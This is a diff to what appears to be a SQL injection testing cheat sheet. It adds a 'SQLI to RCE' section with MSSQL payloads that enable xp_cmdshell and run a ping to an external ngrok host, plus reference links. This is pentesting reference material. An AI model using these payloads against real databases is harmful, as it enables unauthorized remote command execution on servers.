@@ -187,8 +187,17 @@
 
 5. **Automation**:
    - Automate SQL injection testing using scripts and tools like Ghauri and SQLMap.
+### SQLI to RCE
 
----
+```bash
+; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE; —
+
+;EXEC xp_cmdshell ‘ping xxxxxxxx.ngrok.io’; —
+
+https://systemweakness.com/sql-injection-to-remote-command-execution-rce-dd9a75292d1d
+```
+
+
 ---
 - https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md
 
